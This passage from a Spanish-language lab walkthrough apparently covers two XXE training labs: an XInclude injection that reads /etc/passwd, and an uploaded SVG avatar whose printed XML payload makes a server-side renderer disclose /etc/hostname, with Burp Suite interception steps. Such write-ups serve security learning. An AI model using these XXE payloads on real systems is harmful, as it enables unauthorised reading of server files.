Lo que hace es que en la primera linea estamos definiendo el elemento principal, que se declara con foo, y lo que hace el atributo **xmln:xi** es establecer el espacio de nombres. (se necesita una base para que funcione en este caso usamos esta).

Y la siguiente linea estamos incluyendo el archivo de tipo **text** que se define el valor del archivo que recibiremos con **parse**, y ese archivo lo recibiremos de **href**, donde seguido le pasamos el archivo que nos interesa, y por último cerramos el foo.

> Este XXE funciona ya que estamos usando un valor que la web devuelve su valor, pero en caso de que sea un valor estatico obviamente no funcionará.

<br>

Una vez entendimos esta estructura, lo que haremos será agregarla a nuestra petición en lugar del ID del producto, quedandonos así:

![passwd](/assets/images/LabsXXE/lab7/passwd.png)

Y como podemos ver, hemos obtenido el archivo /etc/passwd, completando así este laboratorio:

![end](/assets/images/LabsXXE/lab7/end.png)

<br>

# Laboratorio 8: explotación de XXE a través de la carga de archivos de imagen

En el siguiente laboratorio nos pide lo siguiente:

![lab8](/assets/images/LabsXXE/lab8/lab8.png)

Nos dice que podemos subir avatares, osea, imagenes el formato SVG, y también nos dice que usa Batik, que es una biblioteca de java que nos sirve para renderizar graficos SVG, en el lenguaje de marcado XML, para transformarlos a imagen.

Y que debemos obtener el archivo **/etc/hostname** através de esto.

<br>

Parece confuso, pero iremos paso a paso, primero ingresaremos a el laboratorio:

![enter](/assets/images/LabsXXE/lab8/enter.png)

Podemos apreciar que al entrar nos aparecen diferentes post, en este caso accederemos al primero y daremos donde dice view post.

Al entrar nos llevará a una página donde veremos un post, y al final veremos esto:

![comments](/assets/images/LabsXXE/lab8/comments.png)

Vemos esta sección de comentarios, donde podemos subir nuestro propio comentario.

Iremos de nuevo a la página de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), y veremos una sección que dice:

![payloads](/assets/images/LabsXXE/lab8/payloads.png)

Vemos que nos muestra diferentes payloads con lo que podemos hacer lo que queremos, en este caso probaremos el classic, el cual su estructura se ve así:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Y esta estructura XML lo que hará es que primero declaramos una entidad llamada xxe, la cual contiene el valor del archivo **/etc/hostname**, y después se agrega la imagen en formato svg seguido de que llamaremos a nuestra entidad para que nos muestre el resultado dentro de ese formato.

<br>

Esta estructura será colocada dentro de un archivo con formato .SVG, el cual crearemos a continuación y meteremos estos datos:

![code](/assets/images/LabsXXE/lab8/code.png)

Y ahora guardamos, y en la sección de comentarios subiremos nuestra imagen, y antes de publicar nuestro comentario nos pondremos en escucha desde el intercept de BurpSuite, y al dar a enviar comentario recibiremos la siguiente peticion:

![red](/assets/images/LabsXXE/lab8/redirect.png)

Podemos apreciar que hemos interceptado el archivo .SVG, y vemos la estructura xml que hemos inyectado, en caso de error debemos unificar la estructura XML que vemos.

En este caso no nos dio error, y nos mando un estado 302, lo cual es un redirect, que arriba en burpsuite damos a **Follow redirection** para que nos lleve a donde nos redirige la web.

![submit](/assets/images/LabsXXE/lab8/submit.png)

Podemos apreciar en la respuesta que nuestro comentario se ha subido correctamente en la web.

Ahora si volvemos a el post veremos nuestro comentario:

![comentario](/assets/images/LabsXXE/lab8/comentario.png)

Y podemos apreciar que tiene una imagen en el avatar, como es SVG y le hemos dicho que nos muestre el archivo **/etc/hostname** veremos ese valor en esa imagen, para apreciarla mejor damos click derecho a la imagen y damos en abrir imagen en una pestaña nueva, y podremos apreciar que la imagen que nos creo es lo que hemos dicho que nos lo muestre:

![hostname](/assets/images/LabsXXE/lab8/hostname.png)

Podemos apreciar el nombre de host! y con esto lo ponemos como flag y terminamos este laboratorio:

![fin](/assets/images/LabsXXE/lab8/fin.png)

<br>

